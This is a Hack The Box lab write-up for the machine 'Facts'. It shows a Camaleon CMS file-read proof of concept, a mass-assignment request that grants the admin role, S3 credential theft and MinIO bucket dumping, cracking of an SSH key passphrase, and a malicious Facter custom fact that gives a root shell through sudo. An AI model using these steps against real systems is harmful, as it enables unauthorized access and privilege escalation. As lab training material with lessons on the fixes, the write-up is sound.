---
title: 'Facts'
target: 'Hack The Box — Facts'
difficulty: 'easy'
date: 2025-08-29
summary: 'An HTB machine — Camaleon CMS v2.9.0 file read (CVE-2024-46987) and mass assignment to admin, S3 credential extraction leading to an SSH key in a MinIO bucket, passphrase cracking for shell access, then root via sudo facter custom fact injection.'
role: 'pentest'
tags: ['nmap', 'gobuster', 'camaleon-cms', 'cve-2024-46987', 'file-read', 'mass-assignment', 'privilege-escalation', 'aws-s3', 'minio', 'aws-cli', 'ssh', 'john-the-ripper', 'ruby', 'facter', 'sudo']
problem: 'A Linux machine running SSH, nginx with Camaleon CMS v2.9.0, and MinIO. The CMS has file read and mass assignment vulnerabilities, the admin panel exposes S3 credentials with an SSH key in a bucket, and a sudo facter rule allows arbitrary Ruby code loading.'
action: 'Nmap found SSH (22), nginx (80), and MinIO (54321). Gobuster discovered /admin — Camaleon CMS v2.9.0 with open registration. Exploited CVE-2024-46987 file read to enumerate users trivia and william from /etc/passwd. Mass assignment on the profile update endpoint escalated the account to Admin role. Extracted AWS S3 credentials from Filesystem Settings, enumerated MinIO buckets via AWS CLI, and found an ed25519 SSH key in the internal bucket. Cracked the key passphrase (dragonballz) with John the Ripper and SSH-ed in as trivia. sudo -l showed NOPASSWD facter — created a malicious Ruby custom fact executing /bin/bash -p and loaded it via --custom-dir for root.'
outcome: 'Gained root access. Attack chain: CMS file read and mass assignment for admin, S3 credential extraction for SSH key recovery, passphrase cracking for shell access, facter custom fact injection for root.'
draft: false
---

## Background

Facts is an easy-rated Linux machine hosting a trivia website built with Ruby on Rails and Camaleon CMS. The attack chain flows naturally from web enumeration through credential harvesting to system access — publicly known CMS vulnerabilities provide the initial leverage, exposed AWS credentials in the admin panel lead to an S3 bucket containing SSH keys, and a misconfigured sudo rule on a Ruby-based system profiling tool delivers root. The box demonstrates how a chain of individually minor misconfigurations — an open registration page, a mass assignment flaw, credentials stored in a web interface, and an overly permissive sudo entry — can compound into full system compromise.

---

## Enumeration

An nmap scan against the target reveals three open ports.

```
nmap -Pn -A -p 22,80,54321 10.129.28.82 -T5
```

Port 22 running OpenSSH 9.9p1, port 80 running nginx 1.26.3, and an unusual port 54321 running a Golang HTTP server identified as MinIO — an S3-compatible object store that redirects to port 9001 (inaccessible externally). The nmap fingerprint strings show XML responses with S3-style headers (`X-Amz-Id-2`, `X-Amz-Request-Id`), confirming this is an S3 API endpoint. After adding `facts.htb` to `/etc/hosts`, browsing the website reveals a trivia application with Wappalyzer identifying the tech stack.

![Firefox browser showing the Facts website at http://facts.htb with a teal header banner, the FACTS stamp logo, Discover Amazing Trivia heading, Start Exploring button, and the Wappalyzer extension panel open showing Ruby on Rails 50% sure, jQuery 2.2.4, Modernizr 2.6.2, nginx 1.26.3, Bootstrap 3.4.1, Google Font API, Open Graph, RSS, and Ubuntu.](/writeups/htb-facts/01-website-wappalyzer.png)

The site is powered by Ruby on Rails behind nginx 1.26.3, using Bootstrap 3.4.1 and jQuery 2.2.4. Running gobuster to enumerate directories reveals several interesting endpoints.

![Gobuster results showing entries with status 200 — .web (11110), 400 (6685), 404 (4836), 500 (7918), then highlighted in a red box: admin (3896), admin.cgi (3896), admin.php (3896), admin.pl (3896), followed by ajax (0), cache (11116), captcha (5494), config (11119).](/writeups/htb-facts/02-gobuster.png)

The admin endpoints all return status 200 with the same size (3896 bytes), indicating they all resolve to the same admin panel. Browsing to `/admin/login` presents a login form — and notably, there's a "Create an account" link at the bottom.

![Firefox browser at http://facts.htb/admin/login showing the FACTS logo, a Welcome Please login heading, a red Please login alert banner, Username and Password fields, a Remember Me checkbox, a blue Log In button, and links for Do not have an account yet Create an account and Forgot your password.](/writeups/htb-facts/03-admin-login.png)

Registering an account and logging in grants access to the admin dashboard. The CMS allows anyone who can reach the endpoint to create an account — a significant misconfiguration for an admin panel.

![Firefox browser at http://facts.htb/admin/dashboard showing the Camaleon CMS admin panel with the FACTS logo in the sidebar, a Dashboard link under Main Navigation, and the main content area displaying Welcome to the admin panel of your site.](/writeups/htb-facts/04-admin-dashboard.png)

The dashboard is sparse for a regular user, but the profile edit page reveals additional functionality including password change and file upload capabilities.

![Admin panel showing Edit:Joe Smith profile page with the user's default avatar, Change Photo button, ID 5, Login nooff, E-mail admin@admin.com, Role Client, Update and Change Password buttons, and on the right side a form with First Name Joe, Last Name Smith, Slogan field, Back and Update buttons, and Quick Info showing Last visit and Registration timestamps 2026-02-02 10:53 UTC.](/writeups/htb-facts/05-edit-profile.png)

The user profile shows the account was created with the role "Client" — the lowest privilege level. The CMS footer identifies the software as **Camaleon CMS v2.9.0**.

---

## CVE-2024-46987 — Camaleon CMS file read

CVE-2024-46987 is a file read vulnerability in Camaleon CMS that allows an authenticated user to read arbitrary files from the server. Running a publicly available PoC exploit against the target to read `/etc/passwd` for user enumeration:

```bash
python3 CVE-2024-46987.py -u 'http://facts.htb' -l 'nooff' -p 'haxor' -v '/etc/passwd'
```

![Terminal showing the CVE-2024-46987 exploit execution with Recuperation du token sur http://facts.htb/admin/login, Authentification reussie, then the full /etc/passwd contents with all system users, and highlighted at the bottom trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash and william:x:1001:1001::/home/william:/bin/bash, plus _laurel:x:101:988 entry.](/writeups/htb-facts/06-cve-file-read.png)

The exploit authenticates to the CMS and reads the file successfully. Two users with bash shells stand out — `trivia` (uid=1000) and `william` (uid=1001). Further file reads didn't yield anything immediately useful, but the user enumeration proves valuable later.

---

## Mass assignment — escalation to Admin

Camaleon CMS v2.9.0 has a mass assignment vulnerability in the user profile update functionality. The Rails controller uses `permit!` without restricting which attributes can be updated, allowing a user to modify fields beyond the intended scope — including their role. Intercepting the password change request and injecting `role=admin` into the POST body escalates the account to Administrator.

![Caido/Burp Suite request panel showing POST /admin/users/5/updated_ajax HTTP/1.1 to facts.htb with X-CSRF-Token header, application/x-www-form-urlencoded content type, and the body containing _method=patch, authenticity_token, password and password_confirmation set to haxor, and highlighted role=admin appended at the end of the parameters.](/writeups/htb-facts/07-mass-assignment.png)

The request modifies the `role` parameter under the password attributes from "Client" to "admin". After sending this request, refreshing the page reveals full Administrator access with all the CMS management functionality unlocked — Contents, Media, Comments, Appearance, Plugins, Users, and Settings.

---

## AWS S3 credentials and bucket dumping

With admin access, navigating through the settings reveals critical information under **Filesystem Settings**. The CMS is configured to store files in an AWS S3-compatible bucket, and the full credentials are displayed in the admin panel.

![Camaleon CMS Settings page showing Filesystem Settings tab with Save files in aws s3 checked, Aws s3 access key AKIA08F009B89E5C8894, Aws s3 secret key dpHtrcl7Cfzd7Nm48XlhFu+xQExHXOM9ntzelAY1, Aws s3 bucket name randomfacts, Aws s3 region us-east-1, Aws s3 bucket endpoint http://localhost:54321, and Cloudfront url http://facts.htb/randomfacts.](/writeups/htb-facts/08-s3-keys.png)

The S3 endpoint is `http://localhost:54321` — the MinIO instance identified during the nmap scan. The credentials connect to a bucket named `randomfacts`, with the CloudFront URL confirming that `http://facts.htb/randomfacts` proxies to the S3 bucket. This was already foreshadowed by the S3-style response headers seen when fetching image assets from the site.

![Caido/Burp response panel showing HTTP/1.1 200 OK for http://facts.htb/randomfacts/logopage2.png with Server nginx/1.26.3, Content-Type application/octet-stream, Content-Length 16886, Strict-Transport-Security header, and highlighted X-Amz-Id-2 dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8 and X-Amz-Request-Id 1890BF455A70D1FE headers confirming S3 backend.](/writeups/htb-facts/09-amz-headers.png)

Configuring the AWS CLI with the discovered credentials and enumerating the MinIO instance:

```bash
aws configure
# Access Key: AKIA08F009B89E5C8894
# Secret Key: dpHtrcl7Cfzd7Nm48XlhFu+xQExHXOM9ntzelAY1

aws s3 ls --endpoint-url http://facts.htb:54321
# 2025-09-11 08:06:52 internal
# 2025-09-11 08:06:52 randomfacts

aws s3 ls --endpoint-url http://facts.htb:54321 s3://internal
#                            PRE .bundle/
#                            PRE .cache/
#                            PRE .ssh/
# 2026-01-08 13:45:13        220 .bash_logout
# 2026-01-08 13:45:13       3900 .bashrc
# 2026-01-08 13:47:17         20 .lesshst
# 2026-01-08 13:47:17        807 .profile

aws s3 cp --recursive --endpoint-url http://facts.htb:54321 s3://internal ./s3bucket
```

Two buckets exist — `randomfacts` (the website assets) and `internal`. The `internal` bucket contains what looks like a user's home directory, including a `.ssh` directory. Dumping the bucket reveals an SSH private key.

![Terminal showing ls -la of the s3bucket directory with .bundle, .cache, .ssh directories and standard dotfiles, then ls -la .ssh showing authorized_keys (82 bytes) and id_ed25519 (464 bytes), then cat .ssh/id_ed25519 displaying the full OPENSSH PRIVATE KEY for an ed25519 key.](/writeups/htb-facts/10-ssh-key.png)

---

## Cracking the SSH key and initial access

The SSH key is passphrase-protected. Converting it with `ssh2john` and cracking with John the Ripper using the rockyou wordlist recovers the passphrase quickly.

```bash
ssh2john id_ed > hash
john --wordlist=Downloads/rockyou.txt hash
```

![Terminal showing ssh2john id_ed redirected to hash, then john --wordlist=Downloads/rockyou.txt hash running with UTF-8 encoding, 1 password hash loaded (SSH private key RSA/DSA/EC/OPENSSH), KDF/cipher Cost 1 is 2 and Cost 2 is 24, 4 OpenMP threads, and the cracked passphrase dragonballz shown for id_ed, completing in 1 second.](/writeups/htb-facts/11-john-crack.png)

The passphrase is **dragonballz**. Using the key to SSH in as `trivia` (one of the users enumerated from `/etc/passwd`):

```bash
ssh trivia@facts.htb -i id_ed
```

The key works for user `trivia`. The user flag sits in william's home directory, readable by trivia.

![Terminal showing SSH session as trivia@facts with id output uid=1000(trivia) gid=1000(trivia) groups=1000(trivia), ls -la of trivia's home showing .bundle, .cache, .local, .ssh directories, then ls of /home showing trivia and william directories, cd to william's home showing .bash_history symlinked to /dev/null, standard dotfiles, and user.txt (33 bytes owned by root), then cat user.txt displaying the flag value with the middle portion redacted.](/writeups/htb-facts/12-user-flag.png)

The user flag was retrieved.

---

## Privilege escalation — Facter custom facts

Checking sudo privileges for trivia reveals a path to root.

```bash
trivia@facts:~$ sudo -l
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

Facter is a system profiling tool commonly used with Puppet that collects "facts" about a machine. The script at `/usr/bin/facter` is a Ruby wrapper that passes command-line arguments directly to the Facter CLI launcher without any input validation:

```ruby
#!/usr/bin/ruby
require 'pathname'
require 'facter/framework/cli/cli_launcher'

Facter::OptionsValidator.validate(ARGV)
processed_arguments = CliLauncher.prepare_arguments(ARGV)
CliLauncher.start(processed_arguments)
```

The critical detail is that `ARGV` is passed through without sanitisation, and Facter supports a `--custom-dir` flag that loads Ruby fact files from a user-specified directory. Since facts are Ruby code that gets evaluated by Facter, an attacker can create a malicious fact that executes arbitrary commands — and because the script runs with sudo, those commands execute as root.

![Research notes showing the primary exploitation path — Custom Ruby facts leading to root code execution. Facter intentionally executes Ruby code from user-supplied directories. The script allows this because OptionsValidator.validate(ARGV) only checks syntax, prepare_arguments(ARGV) normalizes but does not restrict, and start(processed_arguments) executes facts. The exploitation path flows from pgsql to sudo script.rb to ARGV attacker controlled to Facter CLI to Load custom facts from attacker directory to Execute Ruby code as root.](/writeups/htb-facts/13-facter-research.png)

Creating a malicious fact in `/tmp` and loading it:

```bash
trivia@facts:/tmp$ cat exploit.rb
Facter.add(:anything) do
  setcode do
    system("/bin/bash -p")
  end
end

trivia@facts:/tmp$ sudo /usr/bin/facter --custom-dir /tmp anything
```

![Terminal showing sudo /usr/bin/facter --custom-dir /tmp anything dropping into a root shell, with id showing uid=0(root) gid=0(root) groups=0(root), cd /root, ls -la showing root's home directory contents including minio-binaries, ministack, snap, .ssh directories and root.txt (33 bytes), then cat root.txt displaying the flag value with the middle portion redacted.](/writeups/htb-facts/14-root-flag.png)

Root shell obtained. The root flag was retrieved.

---

## What I took from this

The Camaleon CMS vulnerabilities on Facts show how a combination of low-severity issues can chain into full admin takeover. The file read (CVE-2024-46987) alone gives limited value — reading `/etc/passwd` for user enumeration is useful but not game-changing. The mass assignment vulnerability alone requires an authenticated session, which an open registration page conveniently provides. Together, they hand over full admin access to anyone who can reach the `/admin` endpoint, and from there the S3 credentials are sitting in the settings page waiting to be copied.

The S3 bucket misconfiguration is a common pattern in cloud-connected applications. The `internal` bucket contained what appears to be a backup or sync of a user's home directory, including their `.ssh` directory with a private key. Storing SSH keys in object storage is dangerous even when the bucket isn't publicly accessible — any credential leak for the storage service immediately compromises the SSH key too. The MinIO instance running on port 54321 was visible from the nmap scan, and the S3-style headers in HTTP responses for image assets hinted at the backend before the admin panel made it explicit.

The Facter privilege escalation is a clean example of why sudo entries for tools that load plugins or external code need careful consideration. Facter's `--custom-dir` flag is a legitimate feature for loading custom facts from non-standard locations, but when the binary runs as root via sudo, any user can point it at a directory they control and execute arbitrary Ruby code with full privileges. The fix is either restricting the sudo entry to specific Facter invocations (disallowing `--custom-dir`), or running Facter as a non-root user. The fact that Ruby is the execution language makes the impact immediate — there's no compilation step, no binary exploitation, just a few lines of Ruby that call `system()` and spawn a shell.
